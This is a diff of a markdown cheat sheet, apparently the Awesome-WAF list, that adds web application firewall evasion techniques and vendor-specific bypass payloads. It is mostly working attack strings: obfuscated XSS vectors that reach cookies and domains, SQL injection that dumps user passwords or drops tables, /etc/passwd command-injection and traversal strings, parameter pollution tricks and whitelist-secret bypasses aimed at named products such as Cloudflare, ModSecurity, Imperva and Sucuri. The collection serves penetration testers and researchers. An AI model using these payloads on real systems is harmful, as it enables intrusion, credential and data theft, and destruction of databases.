@@ -2336,7 +2742,7 @@ __Obfuscated__: `http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/
 __Standard__: `<script>alert()</script>`  
 __Obfuscated__: `%253Cscript%253Ealert()%253C%252Fscript%253E`
 
-__8. Wildcard Encoding__
+__8. Wildcard Obfuscation__
 - Globbing patterns are used by various command-line utilities to work with multiple files.
 - We can tweak them to execute system commands.
 - Specific to remote code execution vulnerabilities on linux systems.
@@ -2387,7 +2793,7 @@ __Obfuscated__: `<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconf
 
 __11. Uninitialized Variables__
 - Uninitialized bash variables can evade bad regular expression based filters and pattern match.
-- Uninitialised variables have value null/they act like empty strings.
+- These have value equal to null/they act like empty strings.
 - Both bash and perl allow this kind of interpretations.
 
 > __BONUS:__ Variable names can have any number of random characters. I have represented them here as `$aaaaaa`, `$bbbbbb`, and so on. You can replace them with any number of random chars like `$ushdjah` and so on.  ;)
@@ -2400,7 +2806,7 @@ __Obfuscated__: `/bin/cat$u /etc/passwd$u`
 __Standard__: `/bin/cat /etc/passwd`  
 __Obfuscated__: <code>$u<b>/bin</b>$u<b>/cat</b>$u $u<b>/etc</b>$u<b>/passwd</b>$u</code>
 
-- __Level 3 Obfuscation__: Random chars   
+- __Level 3 Obfuscation__: Random characters   
 __Standard__: `/bin/cat /etc/passwd`  
 __Obfuscated__: <code>$aaaaaa<b>/bin</b>$bbbbbb<b>/cat</b>$ccccccc $dddddd<b>/etc</b>$eeeeeee<b>/passwd</b>$fffffff</code>
 
@@ -2409,7 +2815,7 @@ An exotic payload crafted:
 $sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf
 ```
 
-__12. Random Tabs__
+__12. Tabs and Line Feeds__
 - Tabs often help to evade firewalls especially regex based ones.
 - Tabs can help break firewall regex when the regex is expecting whitespaces and not tabs.
 
@@ -2417,13 +2823,30 @@ __Standard__: `<IMG SRC="javascript:alert();">`
 __Bypassed__: `<IMG SRC="    javascript:alert();">`  
 __Variant__: `<IMG SRC="    jav    ascri    pt:alert    ();">`
 
+__Standard__: `http://test.com/test?id=1 union select 1,2,3`  
+__Standard__: `http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3`
+
 __Standard__: `<iframe src=javascript:alert(1)></iframe>`  
 __Obfuscated__: 
 ```
 <iframe    src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
 ```
 
-__13. Obfuscation in Other Formats__  
+__13. Token Breakers__
+- Attacks on tokenizers attempt to break the logic of splitting a request into tokens with the help of token breakers.
+- Token breakers are symbols that allow affecting the correspondence between an element of a string and a certain token, and thus bypass search by signature.
+- However, the request must still remain valid while using token-breakers.
+
+- __Case__: Unknown Token for the Tokenizer  
+    - __Payload__: `?id=‘-sqlite_version() UNION SELECT password FROM users --`  
+
+- __Case__: Unknown Context for the Parser (Notice the uncontexted bracket)  
+    - __Payload 1__: `?id=123);DROP TABLE users --`  
+    - __Payload 2__: `?id=1337) INTO OUTFILE ‘xxx’ --`  
+
+> __TIP:__ More payloads can be crafted via this [cheat sheet](https://github.com/attackercan/cpp-sql-fuzzer).
+
+__14. Obfuscation in Other Formats__  
 - Many web applications support different encoding types and can interpret the encoding (see below).
 - Obfuscating our payload to a format not supported by WAF but the server can smuggle our payload in.
 
@@ -2532,6 +2955,116 @@ The following table shows the support of different character encodings on the te
     </tr>
 </table>
 
+### HTTP Parameter Pollution
+#### Method:
+- This attack method is based on how a server interprets parameters with the same names.
+- Possible bypass chances here are:
+    - The server uses the last received parameter, and WAF checks only the first.
+    - The server unites the value from similar parameters, and WAF checks them separately.
+
+#### Technique:
+- The idea is to enumerate how the parameters are being interpreted by the server.
+- In such a case we can pass the payload to a parameter which isn't being inspected by the WAF.
+- Distributing a payload across parameters which can later get concatenated by the server is also useful.
+
+Below is a comparison of different servers and their relative interpretations:
+
+<table>
+    <tr>
+        <td width="40%" align="center"><b>Environment</b></td>
+        <td width="40%" align="center"><b>Parameter Interpretation</b></td>
+        <td align="center"><b>Example</b></td>
+    </tr>
+    <tr>
+        <td align="center">ASP/IIS</td>
+        <td align="center">Concatenation by comma</td>
+        <td align="center">par1=val1,val2</td>
+    </tr>
+    <tr>
+        <td align="center">JSP, Servlet/Apache Tomcat</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">ASP.NET/IIS</td>
+        <td align="center">Concatenation by comma</td>
+        <td align="center">par1=val1,val2</td>
+    </tr>
+    <tr>
+        <td align="center">PHP/Zeus</td>
+        <td align="center">Last parameter is resulting</td>
+        <td align="center">par1=val2</td>
+    </tr>
+    <tr>
+        <td align="center">PHP/Apache</td>
+        <td align="center">Last parameter is resulting</td>
+        <td align="center">par1=val2</td>
+    </tr>
+    <tr>
+        <td align="center">JSP, Servlet/Jetty</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">IBM Lotus Domino</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">IBM HTTP Server</td>
+        <td align="center">Last parameter is resulting</td>
+        <td align="center">par1=val2</td>
+    </tr>
+    <tr>
+        <td align="center">mod_perl, libapeq2/Apache</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">Oracle Application Server 10G</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">Perl CGI/Apache</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">Python/Zope</td>
+        <td align="center">First parameter is resulting</td>
+        <td align="center">par1=val1</td>
+    </tr>
+    <tr>
+        <td align="center">IceWarp</td>
+        <td align="center">An array is returned</td>
+        <td align="center">['val1','val2']</td>
+    </tr>
+    <tr>
+        <td align="center">AXIS 2400</td>
+        <td align="center">Last parameter is resulting</td>
+        <td align="center">par1=val2</td>
+    </tr>
+    <tr>
+        <td align="center">DBMan</td>
+        <td align="center">Concatenation by two tildes</td>
+        <td align="center">par1=val1~~val2</td>
+    </tr>
+    <tr>
+        <td align="center">mod-wsgi (Python)/Apache</td>
+        <td align="center">An array is returned</td>
+        <td align="center">ARRAY(0x8b9058c)</td>
+    </tr>
+</table>
+
+### HTTP Parameter Fragmentation
+- HPF is based on the principle where the server unites the value being passed along the parameters.
+- We can split the payload into different components and then pass the values via the parameters.
+
+__Sample Payload__: `1001 RLIKE (-(-1)) UNION SELECT 1 FROM CREDIT_CARDS`  
+__Sample Query URL__: `http://test.com/url?a=1001+RLIKE&b=(-(-1))+UNION&c=SELECT+1&d=FROM+CREDIT_CARDS`
+> __TIP:__ A real life example how bypasses can be crafted using this method can be found [here](http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2009-August/005673.html).
+
 ### Browser Bugs:
 #### Charset Bugs:
 - We can try changing charset header to higher Unicode (eg. UTF-32) and test payloads.
@@ -2564,6 +3097,9 @@ Payload examples:
 <scri\x00pt>alert(1);</scri%00pt>
 <s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
 ```
+__Standard__: `<a href="javascript:alert()">`  
+__Obfuscated__: `<a href="ja0x09vas0x0A0x0Dcript:alert(1)">clickme</a>`  
+__Variant__: `<a 0x00 href="javascript:alert(1)">clickme</a>`
 
 #### Parsing Bugs:
 - RFC states that NodeNames cannot begin with whitespace.
@@ -2593,6 +3129,49 @@ An exotic payload example:
 <a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>pwn3d
 ```
 
+### Using Atypical Equivalent Syntactic Structures
+- This method aims at finding a way of exploitation not considered by the WAF developers.
+- Some use cases can be twitched to critical levels where the WAF cannot detect the payloads at all.
+- This payload is accepted and executed by the server after going through the firewall.
+
+Some common keywords overlooked by WAF developers:
+- JavaScript functions:
+    - `window`
+    - `parent`
+    - `this`
+    - `self`
+- Tag attributes:
+    - `onwheel`
+    - `ontoggle`
+    - `onfilterchange`
+    - `onbeforescriptexecute`
+    - `ondragstart`
+    - `onauxclick`
+    - `onpointerover`
+    - `srcdoc`
+- SQL Operators
+    - `lpad`
+    - `field`
+    - `bit_count`
+
+Example Payloads:  
+- __Case:__ XSS
+```
+<script>window['alert'](0)</script>
+<script>parent['alert'](1)</script>
+<script>self['alert'](2)</script>
+```
+- __Case:__ SQLi
+```
+SELECT if(LPAD(' ',4,version())='5.7',sleep(5),null);
+1%0b||%0bLPAD(USER,7,1)
+```
+Many alternatives to the original JavaScript can be used, namely:
+- [JSFuck](http://www.jsfuck.com/)
+- [JJEncode](http://utf-8.jp/public/jjencode.html)
+- [XChars.JS](https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html)
+> However the problem in using the above syntactical structures is the long payloads which might possibly be detected by the WAF or may be blocked by the CSP. However, you never know, they might bypass the CSP (if present) too. ;)
+
 ### Abusing SSL/TLS Ciphers:
 - Many a times, servers do accept connections from various SSL/TLS ciphers and versions.
 - Using a cipher to initialise a connection to server which is not supported by the WAF can do our workload.
@@ -2621,6 +3200,21 @@ __Tool__: [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass
 ```
 bash bypass-firewalls-by-DNS-history.sh -d <target> --checkall
 ```
+
+### Using Whitelist Strings:
+#### Method:
+- Some WAF developers keep a shared secret with their users/devs which allows them to pass harmful queries through the WAF.
+- This shared secret, if leaked/known, can be used to bypass all protections within the WAF.
+
+#### Technique:
+- Using the whitelist string as a paramter in GET/POST/PUT/DELETE requests smuggles our payload through the WAF.
+- Usually some `*-sync-request` keywords or a shared token value is used as the secret.
+
+Now when making a request to the server, you can append it as a parameter:
+```
+http://host.com/?randomparameter=<malicious-payload>&<shared-secret>=True
+```
+> A real life example how this works can be found at [this blog](https://osandamalith.com/2019/10/12/bypassing-the-webarx-web-application-firewall-waf/).
 
 ### Request Header Spoofing:
 #### Method:
@@ -2680,6 +3274,10 @@ Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](
 ```
 "; select * from TARGET_TABLE --
 ```
+- [XSS Bypass](https://github.com/kmkz/Pentesting/blob/master/Pentest-Cheat-Sheet#L285) by [@kmkz](https://twitter.com/kmkz_security)
+```
+<script>eval(atob(decodeURIComponent("payload")))//
+```
 
 ### Barracuda 
 - Cross Site Scripting by [@WAFNinja](https://waf.ninja)
@@ -2737,18 +3335,40 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 ``` 
 
 ### Cloudflare
-- XSS Bypass by [@RakeshMane10](https://twitter.com/rakeshmane10)
+- [XSS Bypass](https://pastebin.com/i8Ans4d4) by [@c0d3g33k](https://twitter.com/c0d3g33k)
+```
+<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
+```
+- [XSS Bypasses](https://twitter.com/h1_ragnar) by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar)
+```
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
+1'"><img/src/onerror=.1|alert``>
+```
+- [XSS Bypass](https://twitter.com/RakeshMane10/status/1109008686041759744) by [@RakeshMane10](https://twitter.com/rakeshmane10)
 ```
 <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
 ```
-
-- XSS Bypass by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
+- [XSS Bypass](https://twitter.com/ArbazKiraak/status/1090654066986823680) by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
 ```
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
 ```
 - XSS Bypass by [@Ahmet Ümit](https://twitter.com/ahmetumitbayram)
 ```
 <--`<img/src=` onerror=confirm``> --!>
+```
+- [XSS Bypass](https://twitter.com/le4rner/status/1146453980400082945) by [@Shiva Krishna](https://twitter.com/le4rner)
+```
+javascript:{alert`0`}
+```
+- [XSS Bypass](https://twitter.com/brutelogic/status/1147118371965755393) by [@Brute Logic](https://twitter.com/brutelogic)
+```
+<base href=//knoxss.me?
+```
+- [XSS Bypass](https://twitter.com/RenwaX23/status/1147130091031449601) by [@RenwaX23](https://twitter.com/RenwaX23) (Chrome only)
+```
+<j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x 
 ```
 - [RCE Payload Detection Bypass](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
 ```
@@ -2758,7 +3378,7 @@ cat$u+/etc$u/passwd$u
 ```
 
 ### Comodo 
-- XSS Bypass by [0xInfection](https://twitter.com/0xinfection)
+- XSS Bypass by [@0xInfection](https://twitter.com/0xinfection)
 ```
 <input/oninput='new Function`confir\u006d\`0\``'>
 <p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
@@ -2814,6 +3434,7 @@ Keep-Alive: 300
 - XSS Bypass by [@0xInfection](https://twitter.com/0xinfection)
 ```
 <p draggable=True ondragstart=prompt()>alert
+<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
 ```
 - GET - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
 ```
@@ -2823,7 +3444,6 @@ Keep-Alive: 300
 {3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2B
 h%2Bn)(/0wn3d/.source)" />
 ```
-
 - POST - XSS Bypass (v4.02) by [@DavidK](https://www.exploit-db.com/?author=2741)
 ```
 <img src="WTF" onError="{var
@@ -2875,6 +3495,11 @@ http://<domain>/path?var1=vardata1&var2=vardata2&pad=<large arbitrary data>
 <body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
 ```
+- XSS Bypass by [@Aatif Khan](https://twitter.com/thenapsterkhan)
+```
+<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
+<div contextmenu="xss">Right-Click Here<menu id="xss"onshow="prom%25%32%33%25%32%36x70;t(1)“>
+```
 - [`report_type` XSS](https://www.securityfocus.com/bid/27462/info) by [@NNPoster](https://www.exploit-db.com/?author=6654)
 ```
 https://host/dms/policy/rep_request.php?report_type=%22%3E%3Cbody+onload=alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+
@@ -2918,7 +3543,7 @@ state=%2527+and+
 BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+ 
 ```
 
-### ModSecurity CRS
+### ModSecurity
 - [RCE Payloads Detection Bypass for PL3](https://www.secjuice.com/web-application-firewall-waf-evasion/) by [@theMiddle](https://twitter.com/Menin_TheMiddle) (v3.1)
 ```
 ;+$u+cat+/etc$u/passwd$u
@@ -2935,8 +3560,44 @@ BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+
 ```
 /?in/cat+/et?/passw?
 ```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Johannes Dahse](https://twitter.com/#!/fluxreiners) (v2.2)
+```
+0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Yuri Goltsev](https://twitter.com/#!/ygoltsev) (v2.2)
+```
+1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Ahmad Maulana](http://twitter.com/#!/hmadrwx) (v2.2)
+```
+1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Travis Lee](http://twitter.com/#!/eelsivart) (v2.2)
+```
+amUserId=1 union select username,password,3,4 from users
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Roberto Salgado](http://twitter.com/#!/lightos) (v2.2)
+```
+%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@Georgi Geshev](http://twitter.com/#!/ggeshev) (v2.2)
+```
+1%0bAND(SELECT%0b1%20FROM%20mysql.x)
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@SQLMap Devs](http://sqlmap.sourceforge.net/#developers) (v2.2)
+```
+%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29
+```
+- [SQLi Bypass](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) by [@HackPlayers](http://twitter.com/#!/hackplayers) (v2.2)
+```
+%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201
+```
 
 ### Imperva
+- [XSS Bypass](https://twitter.com/_ugurercan/status/1188406765735632896) by [@ugurercan](https://twitter.com/_ugurercan)
+```
+<details/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"/open>
+```
 - [Imperva SecureSphere 13 - Remote Command Execution](https://www.exploit-db.com/exploits/45542) by [@rsp3ar](https://www.exploit-db.com/?author=9396)
 - XSS Bypass by [@David Y](https://twitter.com/daveysec)
 ```
@@ -2971,7 +3632,11 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 - [Imperva SecureSphere <= v13 - Privilege Escalation](https://www.exploit-db.com/exploits/45130) by [@0x09AL](https://www.exploit-db.com/?author=8991)
 
 ### Kona SiteDefender
-- [HTML Injection](https://hackerone.com/reports/263226) by [@sp1d3rs](https://twitter.com/h1_sp1d3rs)
+- [XSS Bypass](https://twitter.com/h1_kenan/status/1185826172308983808) by [@h1_kenan](https://twitter.com/h1_kenan)
+```
+asd"on+<>+onpointerenter%3d"x%3dconfirm,x(cookie)
+```
+ - [HTML Injection](https://hackerone.com/reports/263226) by [@sp1d3rs](https://twitter.com/h1_sp1d3rs)
 ```
 %2522%253E%253Csvg%2520height%3D%2522100%2522%2520width%3D%2522100%2522%253E%2520%253Ccircle%2520cx%3D%252250%2522%2520cy%3D%252250%2522%2520r%3D%252240%2522%2520stroke%3D%2522black%2522%2520stroke-width%3D%25223%2522%2520fill%3D%2522red%2522%2520%2F%253E%2520%253C%2Fsvg%253E
 ```
@@ -2990,6 +3655,14 @@ stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS 
 - [XSS Bypass](https://hackerone.com/reports/263226) by [@sp1d3rs](https://twitter.com/h1_sp1d3rs)
 ```
 %2522%253E%253C%2Fdiv%253E%253C%2Fdiv%253E%253Cbrute%2520onbeforescriptexecute%3D%2527confirm%28document.domain%29%2527%253E
+```
+- [XSS Bypass](https://twitter.com/fransrosen/status/1126963506723590148) by [@Frans Rosén](https://twitter.com/fransrosen)
+```
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
+```
+- [XSS Bypass](https://twitter.com/security_prince/status/1127804521315426304) by [@Ishaq Mohammed](https://twitter.com/security_prince)
+```
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
 ```
 
 ### Profense
@@ -3022,7 +3695,7 @@ https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<scrip
 ```
 
 ### Sucuri
-- [Smuggling RCE Payloads through Sucuri](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
+- [Smuggling RCE Payloads](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) by [@theMiddle](https://twitter.com/Menin_TheMiddle)
 ```
 /???/??t+/???/??ss??
 ```
@@ -3031,12 +3704,42 @@ https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<scrip
 ;+cat+/e'tc/pass'wd
 c\\a\\t+/et\\c/pas\\swd
 ```
+- [XSS Bypass](https://twitter.com/return_0x/status/1148605627180208129) by [@Luka](https://twitter.com/return_0x)
+```
+"><input/onauxclick="[1].map(prompt)">
+```
+- [XSS Bypass](https://twitter.com/brutelogic/status/1148610104738099201) by [@Brute Logic](https://twitter.com/brutelogic)
+```
+data:text/html,<form action=https://brutelogic.com.br/xss-cp.php method=post>
+<input type=hidden name=a value="<img/src=//knoxss.me/yt.jpg onpointerenter=alert`1`>">
+<input type=submit></form>
+```
+
+### URLScan
+- [Directory Traversal](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt#L557) by [@ZeQ3uL](http://www.exploit-db.com/author/?a=1275) (<= v3.1) (Only on ASP.NET)
+```
+http://host.com/test.asp?file=.%./bla.txt
+```
 
 ### WebARX
 - Cross Site Scripting by [@0xInfection](https://twitter.com/0xinfection)
 ```
 <a69/onauxclick=open&#40&#41>rightclickhere
 ```
+- [Bypassing All Protections Using A Whitelist String](https://osandamalith.com/2019/10/12/bypassing-the-webarx-web-application-firewall-waf/) by [@Osanda Malith](https://twitter.com/OsandaMalith)
+
+    - XSS PoC
+    ```
+    http://host.com/?vulnparam=<script>alert()</script>&ithemes-sync-request
+    ```
+    - LFI PoC
+    ```
+    http://host.com/?vulnparam=../../../../../etc/passwd&ithemes-sync-request
+    ```
+    - SQLi PoC
+    ```
+    http://host.com/?vulnparam=1%20unionselect%20@@version,2--&ithemes-sync-request
+    ```
 
 ### WebKnight
 - Cross Site Scripting by [@WAFNinja](https://waf.ninja/)
@@ -3052,9 +3755,18 @@ c\\a\\t+/et\\c/pas\\swd
 0 union(select 1,username,password from(users))
 0 union(select 1,@@hostname,@@datadir)
 ```
+- XSS Bypass by [@Aatif Khan](https://twitter.com/thenapsterkhan) (v4.1)
+```
+<details ontoggle=alert(1)>
+<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
+```
+- [SQLi Bypass](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt#L562) by [@ZeQ3uL](http://www.exploit-db.com/author/?a=1275)
+```
+10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
+```
 
 ### Wordfence
-- XSS Bypass by [@brutelogic](https://twitter.com/brutelogic)
+- XSS Bypass by [@brute Logic](https://twitter.com/brutelogic)
 ```
 <a href=javas&#99;ript:alert(1)>
 ```
@@ -3110,12 +3822,14 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 - [IdentYwaf](https://github.com/stamparm/identywaf) - A blind WAF detection tool which utlises a unique method of identifying WAFs based upon previously collected fingerprints by [@stamparm](https://github.com/stamparm).
 
 ### Testing:
+- [Lightbulb Framework](https://github.com/lightbulb-framework/lightbulb-framework) - A WAF testing suite written in Python.
 - [WAFBench](https://github.com/microsoft/wafbench) - A WAF performance testing suite by [Microsoft](https://github.com/microsoft).
 - [WAF Testing Framework](https://www.imperva.com/lg/lgw_trial.asp?pid=483) - A WAF testing tool by [Imperva](https://imperva.com).
 
 ### Evasion:  
 - [WAFNinja](https://github.com/khalilbijjou/wafninja) - A smart tool which fuzzes and can suggest bypasses for a given WAF by [@khalilbijjou](https://github.com/khalilbijjou/).
 - [WAFTester](https://github.com/Raz0r/waftester) - Another tool which can obfuscate payloads to bypass WAFs by [@Raz0r](https://github.com/Raz0r/).
+- [libinjection-fuzzer](https://github.com/migolovanov/libinjection-fuzzer) - A fizzer intended for finding `libinjection` bypasses but can be probably used universally.
 - [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history) -  A tool which searches for old DNS records for finding actual site behind the WAF.
 - [abuse-ssl-bypass-waf](https://github.com/LandGrey/abuse-ssl-bypass-waf) - A tool which finds out supported SSL/TLS ciphers and helps in evading WAFs.
 - [SQLMap Tamper Scripts](https://github.com/sqlmapproject/sqlmap) - Tamper scripts in SQLMap obfuscate payloads which might evade some WAFs.
@@ -3149,6 +3863,7 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 - [The Death of a Web App Firewall](https://www.youtube.com/watch?v=mB_xGSNm8Z0) from [Brian McHenry](https://www.youtube.com/channel/UCxzs-N2sHnXFwi0XjDIMTPg).
 - [Adventures with the WAF](https://www.youtube.com/watch?v=rdwB_p0KZXM) from [BSides Manchester](https://www.youtube.com/channel/UC1mLiimOTqZFK98VwM8Ke4w).
 - [Bypassing Intrusion Detection Systems](https://www.youtube.com/watch?v=cJ3LhQXzrXw) from [BlackHat](https://blackhat.com).
+- [Building Your Own WAF as a Service and Forgetting about False Positives](https://www.youtube.com/watch?v=dgqUcHprolc) from [Auscert](https://conference.auscert.org.au).
 
 ## Presentations & Research Papers
 ### Research Papers:
@@ -3158,6 +3873,7 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 - [Poking A Hole in the Firewall](papers/Poking%20A%20Hole%20In%20The%20Firewall.pdf) - A paper by [Rafay Baloch](https://www.rafaybaloch.com) about modern firewall analysis.
 - [Modern WAF Fingerprinting and XSS Filter Bypass](papers/Modern%20WAF%20Fingerprinting%20and%20XSS%20Filter%20Bypass.pdf) - A paper by [Rafay Baloch](https://www.rafaybaloch.com) about WAF fingerprinting and bypassing XSS filters.
 - [WAF Evasion Testing](papers/SANS%20Guide%20-%20WAF%20Evasion%20Testing.pdf) - A WAF evasion testing guide from [SANS](https://www.sans.org).
+- [Side Channel Attacks for Fingerprinting WAF Filter Rules](papers/Side%20Channel%20(Timing)%20Attacks%20for%20Fingerprinting%20WAF%20Rules.pdf) - A paper about how side channel attacks can be utilised to fingerprint firewall filter rules from [UseNix Woot'12](https://www.usenix.org/conference/woot12).
 - [WASC WAF Evaluation Criteria](papers/WASC%20WAF%20Evaluation%20Criteria.pdf) - A guide for WAF Evaluation from [Web Application Security Consortium](http://www.webappsec.org).
 - [WAF Evaluation and Analysis](papers/Web%20Application%20Firewalls%20-%20Evaluation%20and%20Analysis.pdf) - A paper about WAF evaluation and analysis of 2 most used WAFs (ModSecurity & WebKnight) from [University of Amsterdam](http://www.uva.nl).
 - [Bypassing all WAF XSS Filters](papers/Evading%20All%20Web-Application%20Firewalls%20XSS%20Filters.pdf) - A paper about bypassing all XSS filter rules and evading WAFs for XSS.
@@ -3171,9 +3887,11 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 - [Protocol Level WAF Evasion Techniques](presentations/BlackHat%20US%2012%20-%20Protocol%20Level%20WAF%20Evasion%20(Slides).pdf) - A presentation at about efficiently evading WAFs at protocol level from [BlackHat US 12](https://www.blackhat.com/html/bh-us-12/).
 - [Analysing Attacking Detection Logic Mechanisms](presentations/BlackHat%20US%2016%20-%20Analysis%20of%20Attack%20Detection%20Logic.pdf) - A presentation about WAF logic applied to detecting attacks from [BlackHat US 16](https://www.blackhat.com/html/bh-us-16/).
 - [WAF Bypasses and PHP Exploits](presentations/WAF%20Bypasses%20and%20PHP%20Exploits%20(Slides).pdf) - A presentation about evading WAFs and developing related PHP exploits.
-- [Our Favorite XSS Filters/IDS and how to Attack Them](presentations/Our%20Favourite%20XSS%20WAF%20Filters%20And%20How%20To%20Bypass%20Them.pdf) - A presentation about how to evade XSS filters set by WAF rules from [BlackHat USA 09](https://www.blackhat.com/html/bh-us-09/)
+- [Side Channel Attacks for Fingerprinting WAF Filter Rules](presentations/Side%20Channel%20Attacks%20for%20Fingerprinting%20WAF%20Filter%20Rules.pdf) - A presentation about how side channel attacks can be utilised to fingerprint firewall filter rules from [UseNix Woot'12](https://www.usenix.org/conference/woot12).
+- [Our Favorite XSS Filters/IDS and how to Attack Them](presentations/Our%20Favourite%20XSS%20WAF%20Filters%20And%20How%20To%20Bypass%20Them.pdf) - A presentation about how to evade XSS filters set by WAF rules from [BlackHat USA 09](https://www.blackhat.com/html/bh-us-09/).
 - [Playing Around with WAFs](presentations/Playing%20Around%20with%20WAFs.pdf) - A small presentation about WAF profiling and playing around with them from [Defcon 16](http://www.defcon.org/html/defcon-16/dc-16-post.html).
 - [A Forgotten HTTP Invisiblity Cloak](presentation/A%20Forgotten%20HTTP%20Invisibility%20Cloak.pdf) - A presentation about techniques that can be used to bypass common WAFs from [BSides Manchester](https://www.bsidesmcr.org.uk/).
